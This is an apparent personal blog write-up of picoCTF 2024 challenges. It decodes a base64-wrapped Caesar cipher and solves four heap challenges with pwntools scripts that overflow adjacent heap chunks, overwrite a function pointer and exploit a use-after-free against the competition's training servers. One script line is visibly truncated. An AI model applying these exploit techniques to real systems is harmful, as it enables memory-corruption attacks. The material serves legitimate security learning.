---
title: "Picoctf 2024"
date: 2024-04-06T16:56:10+10:00
draft: false
toc: false
Summary: "doing some heap pwn"
images:
tags:
  - ctf
  - pwn
---
This was a fun time to make heap challenges a little less scary. Turns out its very similar to the stack! 

### interencdec
We are given an encrypted flag and have to find out what it is.
`YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzVNR3N5TXpjNWZRPT0nCg==`

Looks like base 64 so lets decode it!

`d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg5MGsyMzc5fQ==`

and again ...

`wpjvJAM{jhlzhy_k3jy9wa3k_890k2379}`

we know the flag starts with p so we can get the offset and solve the rest.

```python
CT = "wpjvJAM{jhlzhy_k3jy9wa3k_890k2379}"   # Encrypted Flag
#find the offset between w and p.
offset = ord('p') - ord('w')
flag = ""
for i in CT:
    if i.islower():
        flag += chr((ord(i) - ord('a') + offset) % 26 + ord('a'))
    elif i.isupper():
        flag += chr((ord(i) - ord('A') + offset) % 26 + ord('A'))
    else:
        flag += i
print(flag)
```

`picoCTF{caesar_d3cr9pt3d_890d2379}`

## heap0/1/2/3
#### heap0
For these challenges we are given a binary and the source code. Most of the challenges follow a similar format. We are greeted with a message, and a menu to perform some options.

```c
void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}
```

There is a heap variable that we have to overwrite. The input var and the safe var are next to each other on the heap. 
```c
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5615039a26b0  ->   pico
+-------------+----------------+
[*]   0x5615039a26d0  ->   bico
+-------------+----------------+
```
So we are allowed to write from one heap allocation to another. This will allow us to satisfy the win condition.
```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

```python
from pwn import *
context.log_level = 'debug'
elf=context.binary=ELF('./chall')
io = remote('tethys.picoctf.net', 57678)
ntil('Enter your choice:')
offset = 0xD0 - 0xB0 + 1
io.sendline('2')
io.readuntil('Data for buffer:')
io.sendline(offset*'A')
io.readuntil('Enter your choice:')
io.sendline('4')
io.interactive()
```

#### heap1
The win condition on heap1 is similar to heap0 but just requires to be the word "pico".
```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
```
With some carefull alignment we can get it in the right place.
```python
from pwn import *
context.log_level = 'debug'
elf=context.binary=ELF('./chal')
#cyclic 60
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
offset = cyclic_find('iaaa')
io = remote('tethys.picoctf.net', 63806)
io.readuntil('Enter your choice:')
io.sendline('2')
io.readuntil('Data for buffer:')
io.sendline(offset*'A'+'pico')
io.readuntil('Enter your choice:')
io.sendline('4')
io.interactive()
```
#### heap2
heap2 is different in that it checks the win with this.
`void check_win() { ((void (*)())*(int*)x)(); }`
This looks like a return2win as there is a win function
```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}
```
The x and input heap allocations are next to eachother so we just have to have x be the address of the win function. Which will be called to jump too.

```python
# aaaabaaacaaadaaaeaaafaaagaaahaaawin
from pwn import *
from pwnlib.util.packing import p64
context.log_level = 'debug'
elf=context.binary=ELF('./heap2')
context(terminal=['tmux', 'splitw', '-h'])
offset = cyclic_find('iaaa')
print(offset)
io = remote('mimas.picoctf.net', 65353)
io.readuntil('Enter your choice:')
io.sendline('2')
io.readuntil('Data for buffer:')
io.sendline(offset*b'A'+ p64(elf.symbols['win']))
io.readuntil('Enter your choice:')
io.sendline('4')
io.interactive()
```

#### heap3
the last challenge shows some problems when we use free. This challenge has a flag struct in memory but has the wrong value

```c
// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```
but `struct.flag` needs to be pico not the bico it starts with. This challenge allows us to create and free the struct in memory. The win condition checks x->flag which is created when the program starts.
```c
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
```
To solve this we need to free the initally created struct. This allows the memory to be freed and when we create a new struct on the heap we get the previously used address which x will still point to. 

```python
from pwn import *
context.log_level = 'debug'
elf=context.binary=ELF('./heap03')
payload = 'aaaabaaacaaadaaaeaaafaaagaaahapico'
io = remote('tethys.picoctf.net', 51032)
io.readuntil('Enter your choice:')
io.sendline('5')
io.readuntil('Enter your choice:')
io.sendline('2')
io.readuntil('Size of object allocation:')
io.sendline('35')
io.readuntil('Data for flag:')
io.sendline(payload)
io.readuntil('Enter your choice:')
io.sendline('4')
io.interactive()
```